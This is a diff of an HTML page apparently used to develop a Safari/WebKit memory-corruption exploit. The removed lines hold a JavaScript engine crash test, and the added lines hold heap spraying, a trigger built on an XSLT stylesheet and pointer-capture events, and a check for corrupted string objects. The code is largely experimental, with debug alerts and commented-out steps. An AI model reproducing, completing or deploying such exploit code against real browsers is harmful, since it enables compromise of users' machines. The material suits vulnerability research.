@@ -1,61 +1,117 @@
 <html>
-<script type="text/javascript">
-	function edenGC() {
-		for (var i = 0; i < 10000; i++) {
-			let a = new Float64Array(100);
-		}
-	}
-
-var backingBuffer = new ArrayBuffer(8)
-var f = new Float64Array(backingBuffer)
-var i = new Uint32Array(backingBuffer)
-function i2f(num) {
-  i[0] = num % 0x100000000
-  i[1] = num / 0x100000000
-  return f[0]
+	<body></body>
+<pre id='log' style="font-size : 40px;"></pre>
+<script>
+    function tohex(n) {
+    if(n < 0) {
+        n = 0xFFFFFFFF + n + 1;
+    }
+    return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
 }
-
-function f2i(num) {
-  f[0] = num
-  return (i[1] * 0x100000000) + i[0]
-}
-function main(me) {
-        const v1 = {};
-        const foo = {};
-        v1.p = {};
-        var leakme = {};
-        const v3 = [13.37,13.37];
-        v3.toString = undefined;
-        if (!v3) {
-            handler = {
-                get (target, propname){
-                	v3[0] = 0x41414141;
-                    return v3[0];
-                }
+        function print(str) {
+            var log = document.getElementById('log');
+            console.log(str);
+            if (log) {
+                log.innerText += "[+] "+str + '\n';
             }
         }
-
-        for (const v5 of "a") {
-            v1.b = v3[0]; //this controls x26 register why i dont know yet or even what this bug is capable of
-		//all i know now is that its an allocation bug
+        function gc() {
+  for (let i = 0; i < 0x400; i++) {
+    new ArrayBuffer(0x1000000);
+  }
+}
+let g_obj_str = {};
+function sprayStringImpl(start, end) {
+    for (let i = start; i < end; i++) {
+        let s = new String("A".repeat(0x48 - 0x14 - 5) + i.toString().padStart(5, "0"));
+        g_obj_str[s] = 0x13371337;
+    }
+}
+        let data_view = new DataView(new ArrayBuffer(8));
+        floatAsQword = float => {
+            data_view.setFloat64(0, float, true);
+            var low = data_view.getUint32(0, true);
+            var high = data_view.getUint32(4, true);
+            return low + high * 0x100000000;
         }
 
-        const handler = v1.p;
-
-        let = String.fromCharCode("");
-        for (let i = 0; i < 2; i++) {
-            let r = handler;
-           if (me == 99999) {
-           alert(r)
-       		}
+        qwordAsFloat = qword => {
+            data_view.setUint32(0, qword%0x100000000, true);
+            data_view.setUint32(4, qword/0x100000000, true);
+            //data_view.setBigUint64(0, qword);
+            return data_view.getFloat64(0);
         }
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        async function main(){
+            alert("Who does pwn my safari?");
+            h1 = document.body.appendChild(document.createElement('h1'));
+h1.textContent = 'please wait...';
+
+cache_frame = document.body.appendChild(document.createElement('iframe')) //fastmalloc object
+cache_frame.style.display = 'none';
+pi = cache_frame.contentDocument.appendChild(
+    document.createProcessingInstruction('xml-stylesheet',
+        'type="text/xml" href="stylesheet.xml"'));
+
+setTimeout(() => {
+  h1.textContent = 'click me';
+  debugger;
+  sprayStringImpl(0,10000)
+  document.addEventListener('lostpointercapture', () => {
+    document.write('x');
+    document.firstChild.remove();
+
+    document.appendChild(pi);
+
+    document.appendChild(document.createElement('root'))
+    document.close(); // triggers an XSLT transformation
+    alert(tohex(cache_frame));
+
+  });
+    
+  document.addEventListener('pointerdown', (event) => {
+    sprayStringImpl(0, 10000);
+    document.body.setPointerCapture(event.pointerId);
+    
+    var arr_str = Object.getOwnPropertyNames(g_obj_str);
+    for (let i = arr_str.length - 1; i > 0; i--) {
+        if (arr_str[i].length > 0xff) {
+            alert(arr_str[i].length)
+            alert("[+] StringImpl corrupted successfully");
+            var g_relative_read = arr_str[i];
+            //var g_obj_str = null;
+            break;
+        }
+    }
+    //alert()
+    let ab = new ArrayBuffer(100);
+        let a = new Float64Array(ab.buffer);
+        
+        //event.pointerId = 
+        //document.body.releasePointerCapture(event.pointerId)
+        //gc()
+        //event.remove()
+        //var b = event.pointerId;
+        //var g_arr_ab_1 = [];
+        //g_arr_ab_1.push(b);
+        for (var i = 0; i < event.pointerId +1; i++ ) {
+            if(tohex(event.pointerId) == 0) {
+                alert(event.pointerId)
+            }
+        }
+        //alert(tohex(event.pointerId))
+        event.pointerId
+        alert(tohex(event.pointerId))
+        //g_arr_ab_1;
+        
+
+    
+  });
+}, 0); // enough time for the style sheet to be cached
+
 }
-function main(){
-var array = new Array(0xFFFFFFFF);
-array.length = 0xFFFFFFFFF
-}
-for (let v0 = 0; v0 < 100000; v0++) {
         main();
-}
 </script>
 </html>
